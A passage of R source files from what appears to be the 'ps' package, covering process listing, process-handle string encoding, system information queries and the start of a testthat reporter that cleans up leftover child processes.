#' Data frame with the currently running processes.
#'
#' Columns shown by default, if `columns` is not given or `NULL`:
#' * `pid`: Process ID.
#' * `ppid`: Process ID of parent process.
#' * `name`: Process name.
#' * `username`: Name of the user (real uid on POSIX).
#' * `status`: I.e. *running*, *sleeping*, etc.
#' * `user`: User CPU time.
#' * `system`: System CPU time.
#' * `rss`: Resident set size, the amount of memory the process currently
#'    uses. Does not include memory that is swapped out. It does include
#'    shared libraries.
#' * `vms`: Virtual memory size. All memory the process has access to.
#' * `created`: Time stamp when the process was created.
#' * `ps_handle`: `ps_handle` objects, in a list column.
#'
#' Additional columns that can be requested via `columns`:
#' * `cmdline`: Command line, in a single string, from [ps_cmdline()].
#' * `vcmdline`: Like `cmdline`, but each command line argument in a
#'   separate string.
#' * `cwd`: Current working directory, from [ps_cwd()].
#' * `exe`: Path of the executable of the process, from [ps_exe()].
#' * `num_fds`: Number of open file descriptors, from [ps_num_fds()].
#' * `num_threads`: Number of threads, from [ps_num_threads()].
#' * `cpu_children_user`: See [ps_cpu_times()].
#' * `cpu_children_system`: See [ps_cpu_times()].
#' * `terminal`: Terminal device, from [ps_terminal()].
#' * `uid_real`: Real user id, from [ps_uids()].
#' * `uid_effective`: Effective user id, from [ps_uids()].
#' * `uid_saved`: Saved user id, from [ps_uids()].
#' * `gid_real`: Real group id, from [ps_gids()].
#' * `gid_effective`: Effective group id, from [ps_gids()].
#' * `gid_saved`: Saved group id, from [ps_gids()].
#' * `mem_shared`: See [ps_memory_info()].
#' * `mem_text`: See [ps_memory_info()].
#' * `mem_data`: See [ps_memory_info()].
#' * `mem_lib`: See [ps_memory_info()].
#' * `mem_dirty`: See [ps_memory_info()].
#' * `mem_pfaults`: See [ps_memory_info()].
#' * `mem_pageins`: See [ps_memory_info()].
#' * `mem_maxrss`: See [ps_memory_full_info()].
#' * `mem_uss`: See [ps_memory_full_info()].
#' * `mem_pss`: See [ps_memory_full_info()].
#' * `mem_swap`: See [ps_memory_full_info()].
#'
#' Use `"*"` in `columns` to include all columns.
#'
#' @param user Username, to filter the results to matching processes.
#' @param after Start time (`POSIXt`), to filter the results to processes
#'   that started after this.
#' @param columns Columns to include in the result. If `NULL` (the default),
#'   then a default set of columns are returned, see below. The columns are
#'   shown in the same order they are specified in `columns`, but each
#'   column is included at most once. Use `"*"` to include all possible
#'   columns, and prefix a column name with `-` to remove it.
#' @return Data frame, see columns below.
#'
#' @details
#' Processes for which a handle cannot be created (e.g. due to insufficient
#' permissions, or because the process exited between enumeration and handle
#' creation) are silently omitted from the result. This means `ps()` may
#' return fewer processes than system tools such as `tasklist` on Windows.
#'
#' @export

ps <- function(user = NULL, after = NULL, columns = NULL) {
  if (!is.null(user)) {
    assert_string(user)
  }
  if (!is.null(after)) {
    assert_time(after)
  }

  columns <- unique(columns %||% ps_default_columns)
  if ("*" %in% columns) {
    columns <- append(columns, ps_all_columns, which(columns == "*"))
    columns <- columns[columns != "*"]
  }
  if (any(bad <- !columns %in% ps_all_columns)) {
    stop(
      "Unknown column",
      if (sum(bad) > 1) "s",
      " requested: ",
      paste(columns[bad], collapse = ", ")
    )
  }

  pids <- ps_pids()
  processes <- not_null(lapply(pids, function(p) {
    tryCatch(ps_handle(p), error = function(e) NULL)
  }))

  ct <- NULL
  if (!is.null(after)) {
    ct <- lapply(processes, ps_create_time)
    selected <- ct >= after
    processes <- processes[selected]
    ct <- ct[selected]
  }

  us <- NULL
  if (!is.null(user)) {
    us <- map_chr(
      processes,
      function(p) fallback(ps_username(p), NA_character_)
    )
    selected <- !is.na(us) & us == user
    processes <- processes[selected]
    us <- us[selected]
    ct <- ct[selected]
  }

  ct <- ct %||%
    lapply(processes, function(p) fallback(ps_create_time(p), NA_time()))

  if (c_username <- "username" %in% columns) {
    us <- us %||%
      map_chr(processes, function(p) fallback(ps_username(p), NA_character_))
  }
  if (c_pid <- "pid" %in% columns) {
    pd <- map_int(processes, function(p) fallback(ps_pid(p), NA_integer_))
  }
  if (c_ppid <- "ppid" %in% columns) {
    pp <- map_int(processes, function(p) fallback(ps_ppid(p), NA_integer_))
  }
  if (c_name <- "name" %in% columns) {
    nm <- map_chr(processes, function(p) fallback(ps_name(p), NA_character_))
  }

  if (c_status <- "status" %in% columns) {
    opt <- options(ps.no_external_ps = TRUE)
    on.exit(options(opt), add = TRUE)
    st <- map_chr(processes, function(p) fallback(ps_status(p), NA_character_))
    options(opt)
    if (
      ps_os_type()[["MACOS"]] &&
        !isTRUE(getOption("ps.no_external_ps")) &&
        anyNA(st[pids != 0])
    ) {
      misspids <- map_int(processes[is.na(st)], ps_pid)
      st[is.na(st)] <- ps_status_macos_ps(misspids)
    }
  }

  c_user <- "user" %in% columns
  c_system <- "system" %in% columns
  c_cpu_children_user <- "cpu_children_user" %in% columns
  c_cpu_children_system <- "cpu_children_system" %in% columns
  if (c_user || c_system || c_cpu_children_user || c_cpu_children_system) {
    time <- lapply(processes, function(p) fallback(ps_cpu_times(p), NULL))
    cpt <- map_dbl(time, function(x) x[["user"]] %||% NA_real_)
    cps <- map_dbl(time, function(x) x[["system"]] %||% NA_real_)
    cpct <- map_dbl(time, function(x) x[["children_user"]] %||% NA_real_)
    cpcs <- map_dbl(time, function(x) x[["children_system"]] %||% NA_real_)
  }
  c_rss <- "rss" %in% columns
  c_vms <- "vms" %in% columns
  c_mem_shared <- "mem_shared" %in% columns
  c_mem_text <- "mem_text" %in% columns
  c_mem_data <- "mem_data" %in% columns
  c_mem_lib <- "mem_lib" %in% columns
  c_mem_dirty <- "mem_dirty" %in% columns
  c_mem_pfaults <- "mem_pfaults" %in% columns
  c_mem_pageins <- "mem_pageins" %in% columns
  c_mem_maxrss <- "mem_maxrss" %in% columns
  c_mem_uss <- "mem_uss" %in% columns
  c_mem_pss <- "mem_pss" %in% columns
  c_mem_swap <- "mem_swap" %in% columns
  if (
    c_rss ||
      c_vms ||
      c_mem_shared ||
      c_mem_text ||
      c_mem_data ||
      c_mem_lib ||
      c_mem_dirty ||
      c_mem_pfaults ||
      c_mem_pageins ||
      c_mem_maxrss ||
      c_mem_uss ||
      c_mem_pss ||
      c_mem_swap
  ) {
    if (c_mem_maxrss || c_mem_uss || c_mem_pss || c_mem_swap) {
      mem <- lapply(
        processes,
        function(p) fallback(ps_memory_full_info(p), NULL)
      )
    } else {
      mem <- lapply(processes, function(p) fallback(ps_memory_info(p), NULL))
    }
    rss <- map_dbl(mem, function(x) x[["rss"]] %||% NA_real_)
    vms <- map_dbl(mem, function(x) x[["vms"]] %||% NA_real_)
    mem_shared <- map_dbl(mem, function(x) x["shared"] %||% NA_real_)
    mem_text <- map_dbl(mem, function(x) x["text"] %||% NA_real_)
    mem_data <- map_dbl(mem, function(x) x["data"] %||% NA_real_)
    mem_lib <- map_dbl(mem, function(x) x["lib"] %||% NA_real_)
    mem_dirty <- map_dbl(mem, function(x) x["dirty"] %||% NA_real_)
    mem_pfaults <- map_dbl(mem, function(x) x["pfaults"] %||% NA_real_)
    mem_pageins <- map_dbl(mem, function(x) x["pageins"] %||% NA_real_)
    mem_maxrss <- map_dbl(mem, function(x) x["maxrss"] %||% NA_real_)
    mem_uss <- map_dbl(mem, function(x) x["uss"] %||% NA_real_)
    mem_pss <- map_dbl(mem, function(x) x["pss"] %||% NA_real_)
    mem_swap <- map_dbl(mem, function(x) x["swap"] %||% NA_real_)
  }
  if (c_ps_handle <- "ps_handle" %in% columns) {
    ps_handle <- I(processes)
  }
  c_cmdline <- "cmdline" %in% columns
  c_vcmdline <- "vcmdline" %in% columns
  if (c_cmdline || c_vcmdline) {
    vcmdline <- I(lapply(
      processes,
      function(p) fallback(ps_cmdline(p), NULL)
    ))
    cmdline <- map_chr(
      vcmdline,
      function(x) {
        if (is.null(x)) NA_character_ else paste(x, collapse = " ")
      }
    )
  }

  if (c_cwd <- "cwd" %in% columns) {
    cwd <- map_chr(processes, function(x) fallback(ps_cwd(x), NA_character_))
  }
  if (c_exe <- "exe" %in% columns) {
    exe <- map_chr(processes, function(x) fallback(ps_exe(x), NA_character_))
  }
  if (c_num_fds <- "num_fds" %in% columns) {
    num_fds <- map_int(
      processes,
      function(x) fallback(ps_num_fds(x), NA_integer_)
    )
  }
  if (c_num_threads <- "num_threads" %in% columns) {
    num_threads <- map_int(
      processes,
      function(x) fallback(ps_num_threads(x), NA_integer_)
    )
  }
  if (c_terminal <- "terminal" %in% columns) {
    terminal <- map_chr(
      processes,
      function(x) fallback(ps_terminal(x), NA_character_)
    )
  }
  c_uid_real <- "uid_real" %in% columns
  c_uid_effective <- "uid_effective" %in% columns
  c_uid_saved <- "uid_saved" %in% columns
  if (c_uid_real || c_uid_effective || c_uid_saved) {
    uids <- lapply(processes, function(x) fallback(ps_uids(x), NULL))
    uid_real <- map_int(
      uids,
      function(x) if (is.null(x)) NA_integer_ else x[["real"]]
    )
    uid_effective <- map_int(
      uids,
      function(x) if (is.null(x)) NA_integer_ else x[["effective"]]
    )
    uid_saved <- map_int(
      uids,
      function(x) if (is.null(x)) NA_integer_ else x[["saved"]]
    )
  }
  c_gid_real <- "gid_real" %in% columns
  c_gid_effective <- "gid_effective" %in% columns
  c_gid_saved <- "gid_saved" %in% columns
  if (c_gid_real || c_gid_effective || c_gid_saved) {
    gids <- lapply(processes, function(x) fallback(ps_gids(x), NULL))
    gid_real <- map_int(
      gids,
      function(x) if (is.null(x)) NA_integer_ else x[["real"]]
    )
    gid_effective <- map_int(
      gids,
      function(x) if (is.null(x)) NA_integer_ else x[["effective"]]
    )
    gid_saved <- map_int(
      gids,
      function(x) if (is.null(x)) NA_integer_ else x[["saved"]]
    )
  }

  c_created <- "created" %in% columns
  created <- format_unix_time(unlist(ct))

  pss <- as_data_frame(not_null(list(
    # default
    pid = if (c_pid) pd,
    ppid = if (c_ppid) pp,
    name = if (c_name) nm,
    username = if (c_username) us,
    status = if (c_status) st,
    user = if (c_user) cpt,
    system = if (c_system) cps,
    rss = if (c_rss) rss,
    vms = if (c_vms) vms,
    created = if (c_created) created,
    ps_handle = if (c_ps_handle) ps_handle,

    # optional
    cmdline = if (c_cmdline) cmdline,
    vcmdline = if (c_vcmdline) vcmdline,
    cwd = if (c_cwd) cwd,
    exe = if (c_exe) exe,
    num_fds = if (c_num_fds) num_fds,
    num_threads = if (c_num_threads) num_threads,
    cpu_children_user = if (c_cpu_children_user) cpct,
    cpu_children_system = if (c_cpu_children_system) cpcs,
    terminal = if (c_terminal) terminal,
    uid_real = if (c_uid_real) uid_real,
    uid_effective = if (c_uid_effective) uid_effective,
    uid_saved = if (c_uid_saved) uid_saved,
    gid_real = if (c_gid_real) gid_real,
    gid_effective = if (c_gid_effective) gid_effective,
    gid_saved = if (c_gid_saved) gid_saved,
    mem_shared = if (c_mem_shared) mem_shared,
    mem_text = if (c_mem_text) mem_text,
    mem_data = if (c_mem_data) mem_data,
    mem_lib = if (c_mem_lib) mem_lib,
    mem_dirty = if (c_mem_dirty) mem_dirty,
    mem_pfaults = if (c_mem_pfaults) mem_pfaults,
    mem_pageins = if (c_mem_pageins) mem_pageins,
    mem_maxrss = if (c_mem_maxrss) mem_maxrss,
    mem_uss = if (c_mem_uss) mem_uss,
    mem_pss = if (c_mem_pss) mem_pss,
    mem_swap = if (c_mem_swap) mem_swap,

    NULL
  )))

  pss <- pss[order(-as.numeric(created)), ]
  pss <- pss[, columns]

  pss
}

ps_default_columns <- c(
  "pid",
  "ppid",
  "name",
  "username",
  "status",
  "user",
  "system",
  "rss",
  "vms",
  "created",
  "ps_handle",
  NULL
)

ps_all_columns <- c(
  ps_default_columns,
  "cmdline", # ps_cmdline
  "vcmdline",
  "cwd", # ps_cwd
  "exe",
  "num_fds", # ps_num_fds
  "num_threads", # ps_num_threads
  "cpu_children_user", # ps_cpu_times
  "cpu_children_system",
  "terminal", # ps_terminal
  "uid_real", # ps_uids
  "uid_effective",
  "uid_saved",
  "gid_real", # ps_gids
  "gid_effective",
  "gid_saved",
  "mem_shared", # ps_memory_info
  "mem_text",
  "mem_data",
  "mem_lib",
  "mem_dirty",
  "mem_pfaults",
  "mem_pageins",
  "mem_maxrss", # ps_full_memory_info
  "mem_uss",
  "mem_pss",
  "mem_swap",
  NULL
)
````

### `pscheck/ps/R/rematch2.R`

````r
re_match <- function(text, pattern, perl = TRUE, ...) {
  text <- as.character(text)

  match <- regexpr(pattern, text, perl = perl, ...)

  start <- as.vector(match)
  length <- attr(match, "match.length")
  end <- start + length - 1L

  matchstr <- substring(text, start, end)
  matchstr[start == -1] <- NA_character_

  res <- data_frame(.text = text, .match = matchstr)

  if (!is.null(attr(match, "capture.start"))) {
    gstart <- attr(match, "capture.start")
    glength <- attr(match, "capture.length")
    gend <- gstart + glength - 1L

    groupstr <- substring(text, gstart, gend)
    groupstr[gstart == -1] <- NA_character_
    dim(groupstr) <- dim(gstart)

    res <- cbind(groupstr, res, stringsAsFactors = FALSE)
  }
  names(res) <- c(attr(match, "capture.names"), ".text", ".match")
  class(res) <- c("tbl", class(res))
  res
}
````

### `pscheck/ps/R/string.R`

````r
#' Encode a `ps_handle` as a short string
#'
#' A convenient format for passing between processes, naming semaphores, or
#' using as a directory/file name. Will always be 12 alphanumeric characters,
#' with the first character guarantied to be a letter. Encodes the pid and
#' creation time for a process.
#'
#' @param p Process handle.
#'
#' @return A process string (scalar character), that can be passed to
#' `ps_handle()` in place of a pid.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' (p <- ps_handle())
#' (str <- ps_string(p))
#' ps_handle(pid = str)

ps_string <- function(p = ps_handle()) {
  assert_ps_handle(p)
  ps__str_encode(p)
}


ps__str_encode <- function(p) {

  # Assumptions:
  #   - Date < 8888-12-02 (Windows only).
  #   - System uptime < 6918 years (Unix only).
  #   - PID <= 768,369,472 (current std max = 4,194,304).
  #   - PIDs are not reused within the same millisecond.

  # Surprisingly, `ps_boot_time()` is not constant from process to process, and
  # `ps_create_time()` is derived from `ps_boot_time()` on Unix. Therefore:
  #   - On Windows, encode `ps_create_time()`
  #   - On Unix, encode `ps_create_time() - `ps_boot_time()`

  pid  <- ps_pid(p)
  time <- as.numeric(ps_create_time(p))

  if (.Platform$OS.type == "unix")
    time <- time - as.numeric(ps_boot_time())

  time <- round(time, 3) * 1000 # millisecond resolution

  map <- c(letters, LETTERS, 0:9)
  paste(
    collapse = '',
    map[
      1 +
        c(
          floor(pid  / 62^(3:0)) %% 62,
          floor(time / 62^(7:0)) %% 62
        )
    ]
  )
}


ps__str_decode <- function(str) {

  map <- structure(0:61, names = c(letters, LETTERS, 0:9))
  val <- map[strsplit(str, '', fixed = TRUE)[[1]]]
  pid <- sum(val[01:04] * 62^(3:0))

  tryCatch(
    expr = {
      p <- ps_handle(pid = pid)
      stopifnot(str == ps__str_encode(p))
      p
    },
    error = function(e) {

      time <- sum(val[05:12] * 62^(7:0)) / 1000

      if (.Platform$OS.type == "unix")
        time <- time + as.numeric(ps_boot_time())

      ps_handle(pid = pid, time = format_unix_time(time))
    }
  )
}
````

### `pscheck/ps/R/system.R`

````r
#' Ids of all processes on the system
#'
#' @return Integer vector of process ids.
#' @export

ps_pids <- function() {
  os <- ps_os_type()
  pp <- if (os[["MACOS"]]) {
    ps_pids_macos()
  } else if (os[["LINUX"]]) {
    ps_pids_linux()
  } else if (os[["WINDOWS"]]) {
    ps_pids_windows()
  } else {
    stop("Not implemented for this platform")
  }

  sort(pp)
}

ps_pids_windows <- function() {
  sort(.Call(ps__pids))
}

ps_pids_macos <- function() {
  ls <- .Call(ps__pids)
  ## 0 is missing from the list, usually, even though it is a process
  if (!0L %in% ls && ps_pid_exists_macos(0L)) {
    ls <- c(ls, 0L)
  }
  ls
}

ps_pid_exists_macos <- function(pid) {
  .Call(psp__pid_exists, as.integer(pid))
}

ps_pids_linux <- function() {
  sort(as.integer(dir("/proc", pattern = "^[0-9]+$")))
}

#' Boot time of the system
#'
#' @return A `POSIXct` object.
#'
#' @export

ps_boot_time <- function() {
  format_unix_time(.Call(ps__boot_time))
}

#' List users connected to the system
#'
#' @return A data frame with columns
#'  `username`, `tty`, `hostname`, `start_time`, `pid`. `tty` and `pid`
#'  are `NA` on Windows. `pid` is the process id of the login process.
#'  For local users the `hostname` column is the empty string.
#'
#' @export

ps_users <- function() {
  l <- not_null(.Call(ps__users))

  d <- data_frame(
    username = vapply(l, "[[", character(1), 1),
    tty = vapply(l, "[[", character(1), 2),
    hostname = vapply(l, "[[", character(1), 3),
    start_time = format_unix_time(vapply(l, "[[", double(1), 4)),
    pid = vapply(l, "[[", integer(1), 5)
  )

  d
}

#' Number of logical or physical CPUs
#'
#' If cannot be determined, it returns `NA`. It also returns `NA` on older
#' Windows systems, e.g. Vista or older and Windows Server 2008 or older.
#'
#' @param logical Whether to count logical CPUs.
#' @return Integer scalar.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_cpu_count(logical = TRUE)
#' ps_cpu_count(logical = FALSE)

ps_cpu_count <- function(logical = TRUE) {
  assert_flag(logical)
  if (logical) ps_cpu_count_logical() else ps_cpu_count_physical()
}

ps_cpu_count_logical <- function() {
  .Call(ps__cpu_count_logical)
}

ps_cpu_count_physical <- function() {
  if (ps_os_type()[["LINUX"]]) {
    ps_cpu_count_physical_linux()
  } else {
    .Call(ps__cpu_count_physical)
  }
}

#' Query the size of the current terminal
#'
#' If the standard output of the current R process is not a terminal,
#' e.g. because it is redirected to a file, or the R process is running in
#' a GUI, then it will throw an error. You need to handle this error if
#' you want to use this function in a package.
#'
#' If an error happens, the error message is different depending on
#' what type of device the standard output is. Some common error messages
#' are:
#' * "Inappropriate ioctl for device."
#' * "Operation not supported on socket."
#' * "Operation not supported by device."
#'
#' Whatever the error message, `ps_tty_size` always fails with an error of
#' class `ps_unknown_tty_size`, which you can catch.
#'
#' @export
#' @examples
#' # An example that falls back to the 'width' option
#' tryCatch(
#'   ps_tty_size(),
#'   ps_unknown_tty_size = function(err) {
#'     c(width = getOption("width"), height = NA_integer_)
#'   }
#' )

ps_tty_size <- function() {
  tryCatch(
    ret <- .Call(ps__tty_size),
    error = function(err) {
      class(err) <- c("ps_unknown_tty_size", class(err))
      stop(err)
    }
  )
  c(width = ret[1], height = ret[2])
}

#' List all processes that loaded a shared library
#'
#' @details
#' ## Notes:
#' This function currently only works on Windows.
#'
#' On Windows, a 32 bit R process can only list other 32 bit processes.
#' Similarly, a 64 bit R process can only list other 64 bit processes.
#' This is a limitation of the Windows API.
#'
#' Even though Windows file systems are (almost always) case
#' insensitive, the matching of `paths`, `user` and also `filter`
#' are case sensitive. This might change in the future.
#'
#' This function can be very slow on Windows, because it needs to
#' enumerate all shared libraries of all processes in the system,
#' unless the `filter` argument is set. Make sure you set `filter`
#' if you can.
#'
#' If you want to look up multiple shared libraries, list all of them
#' in `paths`, instead of calling `ps_shared_lib_users` for each
#' individually.
#'
#' If you are after libraries loaded by R processes, you might want to
#' set `filter` to `c("Rgui.exe", "Rterm.exe", "rsession.exe")` The
#' last one is for RStudio.
#'
#' @param paths Character vector of paths of shared libraries to
#' look up. They must be absolute paths. They don't need to exist.
#' Forward slashes are converted to backward slashes on Windows, and
#' the output will always have backward slashes in the paths.
#' @param user Character scalar or `NULL`. If not `NULL`, then only
#' the processes of this user are considered. It defaults to the
#' current user.
#' @param filter Character vector or `NULL`. If not NULL, then it is
#' a vector of glob expressions, used to filter the process names.
#' @return A data frame with columns:
#' * `dll`: the file name of the dll file, without the path,
#' * `path`: path to the shared library,
#' * `pid`: process ID of the process,
#' * `name`: name of the process,
#' * `username`: username of process owner,
#' * `ps_handle`: `ps_handle` object, that can be used to further
#'   query and manipulate the process.
#'
#' @export
#' @family shared library tools
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check() && ps::ps_os_type()[["WINDOWS"]]
#' dlls <- vapply(getLoadedDLLs(), "[[", character(1), "path")
#' psdll <- dlls[["ps"]][[1]]
#' r_procs <- c("Rgui.exe", "Rterm.exe", "rsession.exe")
#' ps_shared_lib_users(psdll, filter = r_procs)

ps_shared_lib_users <- function(paths, user = ps_username(), filter = NULL) {
  os <- ps_os_type()
  if (!os[["WINDOWS"]]) {
    stop("`ps_shared_lib_users()` currently only works on Windows")
  }
  assert_character(paths)
  if (!is.null(user)) {
    assert_string(user)
  }
  if (!is.null(filter)) {
    assert_character(filter)
  }
  if (os[["WINDOWS"]]) {
    paths <- gsub("/", "\\", paths, fixed = TRUE)
  }

  pids <- ps_pids()
  processes <- not_null(lapply(pids, function(p) {
    tryCatch(ps_handle(p), error = function(e) NULL)
  }))

  nm <- map_chr(processes, function(p) fallback(ps_name(p), NA_character_))

  if (!is.null(filter)) {
    selected <- glob$test_any(filter, nm)
    processes <- processes[selected]
    nm <- nm[selected]
  }

  us <- map_chr(processes, function(p) fallback(ps_username(p), NA_character_))

  if (!is.null(user)) {
    us2 <- short_username(us)
    selected <- (!is.na(us) & us == user) | (!is.na(us2) & us2 == user)
    processes <- processes[selected]
    nm <- nm[selected]
    us <- us[selected]
  }

  libs <- lapply(processes, function(p) {
    tryCatch(ps_shared_libs(p)$path, error = function(e) character())
  })

  # TODO: handle case insensitive OS/FS

  match <- lapply(libs, intersect, paths)
  match_len <- map_int(match, length)
  match_processes <- processes[match_len > 0]
  match_username <- us[match_len > 0]
  match_name <- nm[match_len > 0]
  match_len <- match_len[match_len > 0]
  match_pids <- map_int(match_processes, ps_pid)

  d <- data_frame(
    dll = basename(unlist(match)),
    path = unlist(match),
    pid = rep(match_pids, match_len),
    name = rep(match_name, match_len),
    username = rep(match_username, match_len),
    ps_handle = I(rep(match_processes, match_len))
  )

  # The ones without name probably finished already.
  d <- d[!is.na(d$name), , drop = FALSE]

  d
}

short_username <- function(x) {
  xs <- strsplit(x, "\\", fixed = TRUE)
  p1 <- map_chr(xs, "[", 1)
  p2 <- map_chr(xs, "[", 2)
  ifelse(!is.na(p2), p2, x)
}

# Docs from psutil, thanks!

#' Return the average system load over the last 1, 5 and 15 minutes as a
#' tuple.
#'
#' The “load” represents the processes which are in a runnable
#' state, either using the CPU or waiting to use the CPU (e.g. waiting for
#' disk I/O). On Windows this is emulated by using a Windows API that
#' spawns a thread which keeps running in background and updates results
#' every 5 seconds, mimicking the UNIX behavior. Thus, on Windows, the
#' first time this is called and for the next 5 seconds it will return a
#' meaningless (0.0, 0.0, 0.0) vector. The numbers returned only make sense
#' if related to the number of CPU cores installed on the system. So, for
#' instance, a value of 3.14 on a system with 10 logical CPUs means that
#' the system load was 31.4% percent over the last N minutes.
#'
#' @return Numeric vector of length 3.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_loadavg()

ps_loadavg <- function() {
  if (is.null(ps_env$counter_name)) {
    if (ps_os_type()[["WINDOWS"]]) {
      ps_env$counter_name <- find_loadavg_counter()
    } else {
      ps_env$counter_name <- ""
    }
  }

  .Call(ps__loadavg, ps_env$counter_name)
}

find_loadavg_counter <- function() {
  key <- paste0(
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Perflib\\",
    "CurrentLanguage"
  )
  tryCatch(
    {
      pc <- utils::readRegistry(key)
      idx <- seq(2, length(pc$Counter), by = 2)
      cnt <- structure(pc$Counter[idx], names = pc$Counter[idx - 1])
      nm <- paste0("\\", cnt["2"], "\\", cnt["44"])
      Encoding(nm) <- ""
      enc2utf8(nm)
    },
    error = function(e) "\\System\\Processor Queue Length"
  )
}

#' System CPU times.
#'
#' Every attribute represents the seconds the CPU has spent in the given
#' mode. The attributes availability varies depending on the platform:
#' * `user`: time spent by normal processes executing in user mode;
#'   on Linux this also includes guest time.
#' * `system`: time spent by processes executing in kernel mode.
#' * `idle`: time spent doing nothing.
#'
#' Platform-specific fields:
#'
#' * `nice` (UNIX): time spent by niced (prioritized) processes executing
#'   in user mode; on Linux this also includes guest_nice time.
#' * `iowait` (Linux): time spent waiting for I/O to complete. This is not
#'   accounted in idle time counter.
#' * `irq` (Linux): time spent for servicing hardware interrupts.
#' * `softirq` (Linux): time spent for servicing software interrupts.
#' * `steal` (Linux 2.6.11+): time spent by other operating systems
#'   running in a virtualized environment.
#' * `guest` (Linux 2.6.24+): time spent running a virtual CPU for guest
#'   operating systems under the control of the Linux kernel.
#' * `guest_nice` (Linux 3.2.0+): time spent running a niced guest
#'   (virtual CPU for guest operating systems under the control of the
#'   Linux kernel).
#'
#' @return Named list
#'
#' @export
#' @examplesIf ps::ps_is_supported()
#' ps_system_cpu_times()

ps_system_cpu_times <- function() {
  os <- ps_os_name()
  if (os == "LINUX") {
    ps__system_cpu_times_linux()
  } else {
    .Call(ps__system_cpu_times)
  }
}
````

### `pscheck/ps/R/testthat-reporter.R`

````r
globalVariables("private")

#' testthat reporter that checks if child processes are cleaned up in tests
#'
#' `CleanupReporter` takes an existing testthat `Reporter` object, and
#' wraps it, so it checks for leftover child processes, at the specified
#' place, see the `proc_unit` argument below.
#'
#' Child processes can be reported via a failed expectation, cleaned up
#' silently, or cleaned up and reported (the default).
#'
#' If a `test_that()` block has an error, `CLeanupReporter` does not
#' emit any expectations at the end of that block. The error will lead to a
#' test failure anyway. It will still perform the cleanup, if requested,
#' however.
#'
#' The constructor of the `CleanupReporter` class has options:
#' * `file`: the output file, if any, this is passed to `reporter`.
#' * `proc_unit`: when to perform the child process check and cleanup.
#'   Possible values:
#'     * `"test"`: at the end of each [testthat::test_that()] block
#'       (the default),
#'     * `"testsuite"`: at the end of the test suite.
#' * `proc_cleanup`: Logical scalar, whether to kill the leftover
#'   processes, `TRUE` by default.
#' * `proc_fail`: Whether to create an expectation, that fails if there
#'   are any processes alive, `TRUE` by default.
#' * `proc_timeout`: How long to wait for the processes to quit. This is
#'   sometimes needed, because even if some kill signals were sent to
#'   child processes, it might take a short time for these to take effect.
#'   It defaults to one second.
#' * `rconn_unit`: When to perform the R connection cleanup. Possible values
#'   are `"test"` and `"testsuite"`, like for `proc_unit`.
#' * `rconn_cleanup`: Logical scalar, whether to clean up leftover R
#'   connections. `TRUE` by default.
#' * `rconn_fail`: Whether to fail for leftover R connections. `TRUE` by
#'   default.
#' * `file_unit`: When to check for open files. Possible values are
#'    `"test"` and `"testsuite"`, like for `proc_unit`.
#' * `file_fail`: Whether to fail for leftover open files. `TRUE` by
#'   default.
#' * `conn_unit`: When to check for open network connections.
#'   Possible values are `"test"` and `"testsuite"`, like for `proc_unit`.
#' * `conn_fail`: Whether to fail for leftover network connections.
#'   `TRUE` by default.
#'
#' @note Some IDEs, like RStudio, start child processes frequently, and
#' sometimes crash when these are killed, only use this reporter in a
#' terminal session. In particular, you can always use it in the
#' idiomatic `testthat.R` file, that calls `test_check()` during
#' `R CMD check`.
#'
#' @param reporter A testthat reporter to wrap into a new `CleanupReporter`
#'   class.
#' @return New reporter class that behaves exactly like `reporter`,
#'   but it checks for, and optionally cleans up child processes, at the
#'   specified granularity.
#'
#' @section Examples:
#' This is how to use this reporter in `testthat.R`:
#' ```
#' library(testthat)
#' library(mypackage)
#'
#' if  (ps::ps_is_supported()) {
#'   reporter <- ps::CleanupReporter(testthat::ProgressReporter)$new(
#'     proc_unit = "test", proc_cleanup = TRUE)
#' } else {
#'   ## ps does not support this platform
#'   reporter <- "progress"
#' }
#'
#' test_check("mypackage", reporter = reporter)
#' ```
#'
#' @export

CleanupReporter <- function(reporter = testthat::ProgressReporter) {
  missing_pkgs <- Filter(
    function(pkg) !requireNamespace(pkg, quietly = TRUE),
    c("R6", "testthat", "rlang")
  )
  if (length(missing_pkgs) > 0) {
    stop(
      "The following package(s) are required for CleanupReporter() but are not installed: ",
      paste0("'", missing_pkgs, "'", collapse = ", "),
      "."
    )
  }
  R6::R6Class(
    "CleanupReporter",
    inherit = reporter,
    public = list(
      initialize = function(
        file = getOption("testthat.output_file", stdout()),
        proc_unit = c("test", "testsuite"),
        proc_cleanup = TRUE,
        proc_fail = TRUE,
        proc_timeout = 1000,
        rconn_unit = c("test", "testsuite"),
        rconn_cleanup = TRUE,
        rconn_fail = TRUE,
        file_unit = c("test", "testsuite"),
        file_fail = TRUE,
        conn_unit = c("test", "testsuite"),
        conn_fail = TRUE
      ) {
        if (!ps::ps_is_supported()) {
          stop("CleanupReporter is not supported on this platform")
        }

        super$initialize(file = file)
        private$proc_unit <- match.arg(proc_unit)
        private$proc_cleanup <- proc_cleanup
        private$proc_fail <- proc_fail
        private$proc_timeout <- proc_timeout

        private$rconn_unit <- match.arg(rconn_unit)
        private$rconn_cleanup <- rconn_cleanup
        private$rconn_fail <- rconn_fail

        private$file_unit <- match.arg(file_unit)
        private$file_fail <- file_fail

        private$conn_unit <- match.arg(conn_unit)
        private$conn_fail <- conn_fail

        invisible(self)
      },

      start_test = function(context, test) {
        private$has_error <- FALSE
        super$start_test(context, test)
        if (private$file_unit == "test") {
          private$files <- ps_open_files(ps_handle())
        }
        if (private$rconn_unit == "test") {
          private$rconns <- showConnections()
        }
        if (private$proc_unit == "test") {
          private$tree_id <- ps::ps_mark_tree()
        }
        if (private$conn_unit == "test") {
          private$conns <- ps_connections(ps_handle())
        }
      },

      end_test = function(context, test) {
        if (private$proc_unit == "test") {
          self$do_proc_cleanup(test)
        }
        if (private$rconn_unit == "test") {
          self$do_rconn_cleanup(test)
        }
        if (private$file_unit == "test") {
          self$do_file_cleanup(test)
        }
        if (private$conn_unit == "test") {
          self$do_conn_cleanup(test)
        }
        super$end_test(context, test)
      },

      add_result = function(context, test, result) {
        if (inherits(result, "expectation_error")) {
          private$has_error <- TRUE
        }
        super$add_result(context, test, result)
      },

      start_reporter = function() {
        super$start_reporter()
        if (private$file_unit == "testsuite") {
          private$files <- ps_open_files(ps_handle())
        }
        if (private$rconn_unit == "testsuite") {
